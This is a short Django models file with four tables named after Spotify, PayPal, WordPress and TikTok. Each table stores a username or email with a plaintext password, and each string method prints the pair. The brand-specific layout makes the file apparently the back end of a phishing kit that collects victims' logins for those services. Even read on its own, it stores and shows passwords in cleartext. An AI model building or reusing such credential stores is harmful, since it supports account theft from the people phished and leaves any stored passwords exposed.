from django.db import models



class SpotifyModel(models.Model):
    username = models.CharField(max_length=30)
    password = models.CharField(max_length=50)
    def __str__(self):
        return f"{self.username} - {self.password}" 

class PaypalModel(models.Model):
    email = models.EmailField(max_length=300)
    password = models.CharField(max_length=50)
    def __str__(self):
        return f"{self.email} - {self.password}"    

class WordPressModel(models.Model):
    username = models.CharField(max_length=200)
    password = models.CharField(max_length=100)
    def __str__(self):
        return f"{self.username} - {self.password}"
    
class TiktokModel(models.Model):
    username = models.CharField(max_length=100)
    password = models.CharField(max_length=100)
    def __str__(self):
        return f"{self.username} - {self.password}"    